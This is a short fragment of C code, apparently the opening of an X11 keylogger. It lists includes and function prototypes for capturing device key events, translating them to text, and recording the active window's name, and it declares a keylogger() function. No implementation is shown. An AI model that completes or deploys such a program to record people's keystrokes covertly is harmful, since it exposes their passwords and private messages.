#include <X11/XKBlib.h>
#include <X11/Xlib.h>
#include <X11/extensions/XInput.h>
#include <X11/keysymdef.h>
#include <assert.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <time.h>

static int process_event(const struct keystroke_info *info);
static void register_events(Display *display, Window root);
static XIC get_input_context(Display *display);
static int translate_device_key_event(XIC xic, XDeviceKeyEvent *event, KeySym *out_keysym, char *out_string);
static int get_window_property(Display *display, Window window, const char *name, const char *type, void *data);
static int get_window_name(Display *display, Window window, char **name);
static int get_current_window(Display *display, Window **window);
int keylogger();